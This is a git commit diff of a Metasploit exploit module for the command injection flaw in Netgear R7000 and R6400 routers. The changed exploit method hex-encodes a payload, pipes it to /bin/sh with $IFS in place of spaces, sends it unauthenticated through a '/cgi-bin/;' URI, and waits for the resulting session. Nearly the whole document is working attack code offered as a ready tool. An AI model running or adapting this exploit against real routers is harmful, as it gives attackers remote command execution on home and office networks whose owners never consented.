c797497620452ccaa688727d652657c8cb75fb31
Carter <cbawsome77@gmail.com>
2017-02-14 15:39:11 -0500

    Update netgear_r7000_command_injection.rb

--- netgear stuff/netgear_r7000_command_injection.rb
+++ netgear stuff/netgear_r7000_command_injection.rb
@@ -4,9 +4,10 @@
 ##
 
 require 'msf/core'
-require 'rex'
 
 class MetasploitModule < Msf:Exploit::Remote
+  Rank = ExcellentRanking
+
   include Msf::Exploit::Remote::HttpClient
   include Rex::Proto::Http
 
@@ -18,12 +19,14 @@ class MetasploitModule < Msf:Exploit::Remote
         Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
       },
       'License'              => MSF_LICENSE,
-      'Platform'             => ['linux'],
+      'Platform'             => 'linux',
       'Author'               => ['thecarterb', 'Acew0rm'],
+      'DefaultTarget'        => 0,
+      'Privileged'           => false,
+      'Arch'                 => [ARCH_X86, ARCH_X64],
       'Targets'              => [
         [ 'Netgear firmware v1.0.7.2_1.1.93', { } ]
       ],
-      'DefaultTarget'        => 0,
       'References'           =>
         [
           [ 'EDB', '40889'],
@@ -61,36 +64,31 @@ class MetasploitModule < Msf:Exploit::Remote
       print_status("Router is a NETGEAR router")
       if model == "R7000" || model == "R6400"
         print_good("Router is vulnerable (NETGEAR #{model})")
-        return Exploit::CheckCode::Detected
+        return CheckCode::Detected
       end
-    else 
+    else
       print_error('Router is not a NETGEAR router')
-      return Exploit::CheckCode::Safe
+      return CheckCode::Safe
     end
   end
 
-  def run
-    #Main Function
-    #convert datastores to variables
-    cmd   = datastore['CMD']
-    rhost = datastore['RHOST']
-
-    print_status("Sending request to #{rhost}")
-
-    #replace spaces with $IFS in CMD
-    cmd = cmd.gsub! ' ', '$IFS'
-
-    begin
-      #send the request containing the edited command
-      send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
-    rescue Rex::ConnectionTimeout => ct
-      print_error(ct.message)
-    rescue Rex::ConnectionError => ce
-      print_error(ce.message)
-    rescue Rex::ConnectionRefused => cr
-      print_error(cr.message)
-    rescue Rex::Exception => e
-      print_error(e.message)
+  
+  # Mostly from ddwrt_cgibin_exec.rb, maybe change some stuff idk
+  def exploit
+    is_vuln = check
+    if is_vuln == CheckCode::Safe
+      return
     end
+    cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
+    # TODO: force use of echo-ne CMD encoder
+    str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"
+
+    print_status("Sending GET request with encoded command line...")
+    send_request_raw({ 'uri' => "/cgi-bin/;#{str}" })
+
+    print_status("Giving the handler time to run...")
+    handler
+
+    select(nil, nil, nil, 10.0)
   end
 end
